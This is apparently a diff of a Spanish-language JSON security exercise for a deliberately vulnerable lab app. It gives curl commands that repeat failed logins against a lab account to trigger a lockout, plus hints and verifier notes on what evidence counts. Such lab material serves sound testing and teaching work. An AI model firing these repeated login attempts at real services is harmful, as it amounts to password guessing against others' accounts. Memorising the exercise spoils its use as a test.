+        "Primer fallo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Segundo fallo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Tercer fallo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Cuarto intento, que debe activar el bloqueo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Comparar los campos JSON del cuarto intento con LEVEL_5 y detenerse; no cambiar de usuario para rodear el límite ni lanzar más solicitudes."
+      ],
+      "hints": [
+        "La clave del contador es el username y el bloqueo se comprueba antes de volver a consultar el repositorio.",
+        "Si el cuarto intento ya está bloqueado al comenzar, reiniciar únicamente la instancia aislada o anotar que el estado en memoria ya existía; no ampliar la prueba.",
+        "La evidencia positiva es loginBlocked=true, no la latencia ni el código 200."
+      ]
+    }
+  ],
+  "limitations": [
+    "La revisión corresponde al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y documenta el código, recursos y tests leídos; no afirma que los comandos hayan sido ejecutados contra target ni que una respuesta observada haya sido exitosa.",
+    "Los tokens, sesiones y contadores viven en memoria del proceso. Los valores SESSION-1001/1002 y Base64(SESSION-19020/19120) solo son reproducibles al iniciar una instancia limpia; después deben sustituirse por los valores observados y por el incremento documentado.",
+    "El SQL de semilla contiene las cuentas session_user, session_attacker, session_admin y session_rate_limit_victim. El informe usa únicamente esas credenciales de laboratorio y marcadores de contraseña incorrecta; no intenta descubrir secretos ni leer archivos del host.",
+    "LEVEL_6 no tiene un mapping HTTP GET para /profile. La prueba de servicio confirma la semántica de invalidación, pero por HTTP solo puede comprobarse la rotación, los datos devueltos, la cabecera del cookie, el resultado explícito de logout y el bloqueo de login.",
+    "Un HTTP 200 no prueba autenticación, invalidación ni control de acceso: hay que parsear isValid y los campos de content. Un Set-Cookie que borra el navegador tampoco demuestra que el token antiguo haya sido revocado.",
+    "Para un verificador honesto, un reflejo de texto no prueba ejecución XSS, un 200 no prueba IDOR y no se debe atribuir puntaje porque una persona haga click. En esta familia la evidencia debe ser la transición de estado y los campos JSON/cookies indicados, no una interacción visual.",
+    "Los objetos check usan kind contains, not_contains, header, json o manual; en los checks json, path es una ruta de campos separada por puntos (por ejemplo content.loginBlocked). Un verificador debe tratar ausencia, JSON inválido, cookie faltante y respuestas 5xx como resultado inconcluso, no como hallazgo automático.",
+    "Los ejercicios son deliberadamente pequeños y secuenciales: no incluyen comandos ejecutados por el objetivo, reverse shells, lecturas de secretos, acceso a rutas de archivos, denegación de servicio, borrado de datos ni llamadas a servicios distintos del laboratorio autorizado."
+  ]
+}
